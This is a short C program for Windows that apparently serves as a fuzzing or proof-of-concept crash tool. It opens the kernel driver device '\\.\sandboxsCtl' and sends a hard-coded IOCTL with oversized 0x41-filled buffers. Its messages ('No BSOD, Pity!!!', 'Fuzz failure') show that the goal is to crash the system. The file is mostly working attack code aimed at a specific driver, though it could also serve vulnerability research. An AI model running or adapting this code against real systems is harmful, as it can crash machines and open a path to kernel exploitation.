#include<stdio.h>
#include<Windows.h>






// Gives the error message corresponding to a given Win32 error code ----------
char *errorCode2String(DWORD errorCode) {

	LPVOID lpMsgBuf;

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		errorCode,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	return (char*)lpMsgBuf;
}


int main()
{
	LPCWSTR lpDeviceName;
	HANDLE deviceHandle;
	char   deviceName[100] = "\\\\.\\sandboxsCtl";
	DWORD  IoctlCode = 0x1236001c;
	DWORD  status;
	DWORD  nbBytes = 0;
	BYTE  brutebufInput[0x10000];
	BYTE  brutebufOutput[0x10000];
	int count = 65535;



	WCHAR wsz[100] = { 0 };
	MultiByteToWideChar(CP_ACP, 0, deviceName, strlen(deviceName) + 1, wsz, sizeof(wsz));
	lpDeviceName = wsz;
	printf("[~] Open handle to the device %s ...\n", deviceName);

	deviceHandle = CreateFile(lpDeviceName,
		GENERIC_READ | GENERIC_WRITE,					// Open for reading/writing| GENERIC_WRITE
		0,//FILE_SHARE_WRITE,								// Allow Share
		NULL,											// Default security
		OPEN_EXISTING,									// Opens a file or device, only if it exists.
		0,//FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,	// Normal file
		NULL);
	if (deviceHandle == INVALID_HANDLE_VALUE) {
		printf("[-] FAILED, error code: %d\n%s\n", GetLastError(),
			errorCode2String(GetLastError()));

		if (GetLastError() == 5)
		{
			printf("[!] Access Driver Deny,Please try Administrator...(If you are Administrator, Fuzz failure,try another Driver..\n)");
		}
		exit(1);
	}

	memset(brutebufInput, 0x41, 0x10000);
	memset(brutebufOutput, 0x41, 0x10000);
	//for (int i = 0; i < 65535; i++) {
	//printf("0x%x\n", i);
	printf("input anything to send the IO Code: 0x%x", IoctlCode);
	getchar();
	status = DeviceIoControl(deviceHandle,
		IoctlCode,
		&brutebufInput,
		count,
		&brutebufOutput,
		count,
		&nbBytes,
		NULL);
	//}
	printf("No BSOD, Pity!!!\n\n");
}